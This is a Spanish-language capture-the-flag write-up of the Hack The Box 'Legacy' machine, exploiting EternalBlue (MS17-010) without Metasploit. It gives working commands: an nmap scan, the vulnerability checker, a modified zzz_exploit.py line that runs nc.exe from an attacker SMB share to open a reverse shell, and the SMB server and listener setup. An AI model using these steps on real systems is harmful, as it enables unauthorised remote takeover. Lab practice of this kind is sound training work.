
---
# 🧨 HTB - Legacy 🧨
 
**Sistema:** Windows  
**Dificultad:** Fácil  
**Vector de ataque:** MS17-010 (EternalBlue)  
**Restricciones:** Sin Metasploit

---

## 🧠 Contexto

Legacy es una de las máquinas más icónicas de Hack The Box por una razón: expone la famosísima vulnerabilidad EternalBlue, la misma que fue usada en ataques reales como WannaCry.

En este write-up te muestro cómo explotamos esta máquina **sin usar Metasploit**, usando un repositorio externo de GitHub. Nos tocó consultar mucho, pero valió cada línea de código.

---

## 🔍 Enumeración

Iniciamos con un escaneo básico:

```bash
sudo nmap -p- --open -sCV --min-rate=5000 -vvv -n -Pn <ip> -oG escaneo
````

Puertos abiertos:

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds

Clásico indicio de que puede estar corriendo SMB vulnerable.

---

## ⚡ Verificación de MS17-010

Clonamos el repo de worawit, especializado en EternalBlue sin Metasploit:

```bash
git clone https://github.com/worawit/MS17-010.git
cd MS17-010
python2 checker.py 10.10.10.4
```

Resultado clave:

Correr el escript en python Checker y ver el resultado Ok (32 bit)

```
python2 checker.py <ip>
browser: Ok (32 bit)
```

Confirmado: **Legacy es vulnerable**. Hora de preparar el ataque.

---

## 🧪 Modificación del Exploit

Vamos directo al punto. Entramos a la carpeta del exploit:

```bash
cd MS17-010
nano zzz_exploit
```

Editamos `zzz_exploit.py`. Dentro de la función `smb_pwn(conn, arch)`, comentamos todo y dejamos solo esta línea **descomentada**:

```python
service_exec(conn, r'cmd /c \\<TU_IP>\mmvg\nc.exe -e cmd <TU_IP> 444')
```

> Reemplaza `<TU_IP>` con tu IP tun0. Asegúrate de usar un puerto libre (yo usé el 444 porque 443 estaba ocupado por HTB).

---

## 🛠️ Configuración del entorno

Copiamos `nc.exe` al directorio del servidor SMB:

```bash
cp /usr/share/wordlists/SecLists/Web-Shells/FuzzDB/nc.exe ../../content
```

Levantamos el servidor SMB:

```bash
smbserver.py mmvg $(pwd)
```

**smbserver.py** Es un script que forma parte del repositorio **Impacket**, una colección de herramientas para trabajar con protocolos de red, especialmente útiles en pentesting.
Nos ponemos en escucha:

```bash
rlwrap nc -nlvp 444
```

**rlwrap** es una herramienta súper útil para la terminal que **añade historial y autocompletado** a programas que normalmente **no lo tienen**, como por ejemplo algunos shells interactivos o binarios que ejecutas en CTFs o pentests.

---

## 🚀 Ejecución del Exploit

Volvemos a correr el exploit:

```bash
python2 zzz_exploit.py <TU_IP> browser
```

⏳ En algunos casos la reverse shell llega al toque. A mí me tocó esperar a que el script terminara por completo. Hay que tener paciencia y seguir en escucha.

---

## 🔥 Shell obtenida

Y de pronto... ¡Boom! Reverse shell con privilegios altos:

```cmd
whoami
nt authority\system
```

Capturamos las flags:

```cmd
type C:\Users\john\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

---

## 🧩 Problemas con Python2

Tuve errores con pip2, así que hice esto para preparar el entorno:
# Instalar setuptools compatible con Python2

```bash
wget https://files.pythonhosted.org/packages/source/s/setuptools/setuptools-44.1.1.zip
unzip setuptools-44.1.1.zip
cd setuptools-44.1.1
sudo python2 setup.py install
```

### Volver a la carpeta del exploit y correr:

```bash
pip2 install .
```

---

## 🎯 Conclusiones

- Explotar EternalBlue sin Metasploit **te obliga a entender realmente cómo funciona el payload.**
    
- Tener control sobre el shell y el servidor SMB fue clave.
    
- Esta máquina es oro puro para practicar explotación manual y reverse shells en Windows.
    

**Herramientas usadas:**

- `nmap`
    
- `python2`
    
- `zzz_exploit.py`
    
- `impacket-smbserver`
    
- `rlwrap`
    
- `nc.exe`
    

> Explota el conocimiento, no solo los servicios 😈

---

## 📎 Recursos

- [Exploit usado - worawit/MS17-010](https://github.com/worawit/MS17-010)

